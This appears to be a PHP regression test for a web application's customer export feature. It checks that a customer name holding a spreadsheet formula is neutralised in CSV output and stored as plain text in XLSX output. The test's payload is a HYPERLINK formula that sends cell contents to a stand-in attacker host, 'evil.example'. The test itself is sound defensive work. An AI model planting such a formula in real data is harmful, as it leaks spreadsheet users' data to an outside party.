<?php

namespace Tests\Feature;

use App\Models\Customer;
use App\Models\User;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TenantTestCase;

/**
 * Issue #898 (SALES-PLAT P2, PC4) — end-to-end reproduction through the real
 * export routes: a customer named =HYPERLINK(...) must not execute when the
 * generated CSV is opened in Excel / Google Sheets, while XLSX output keeps
 * the raw value stored as an explicit string (unchanged behaviour).
 */
class Issue898CsvFormulaInjectionExportTest extends TenantTestCase
{
    private const PAYLOAD = '=HYPERLINK("http://evil.example/collect?x="&A1,"Click me")';

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();

        $this->admin = $this->setUpTenantAdminUser('Issue 898 Tenant');
    }

    public function test_customers_csv_export_neutralises_a_formula_customer_name(): void
    {
        Customer::factory()->create(['name' => self::PAYLOAD]);

        $response = $this->actingAs($this->admin)->get('/api/v1/customers/export?'.http_build_query([
            'columns' => ['name'],
            'format' => 'csv',
        ]));
        $response->assertOk();

        $rows = array_map('str_getcsv', array_values(array_filter(
            explode("\n", trim($this->downloadedContents($response)))
        )));

        $this->assertSame('Customer Name', $rows[0][0]);
        $this->assertSame(
            "'".self::PAYLOAD,
            $rows[1][0],
            'CSV exports must prefix formula-triggering values so spreadsheet apps treat them as text.'
        );
    }

    public function test_customers_xlsx_export_keeps_the_raw_value_as_an_explicit_string(): void
    {
        Customer::factory()->create(['name' => self::PAYLOAD]);

        $response = $this->actingAs($this->admin)->get('/api/v1/customers/export?'.http_build_query([
            'columns' => ['name'],
            'format' => 'xlsx',
        ]));
        $response->assertOk();

        $path = $response->baseResponse->getFile()->getPathname();
        $cell = IOFactory::load($path)->getActiveSheet()->getCell('A2');

        $this->assertSame(self::PAYLOAD, $cell->getValue());
        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
    }

    private function downloadedContents($response): string
    {
        $path = $response->baseResponse->getFile()->getPathname();

        return (string) file_get_contents($path);
    }
}
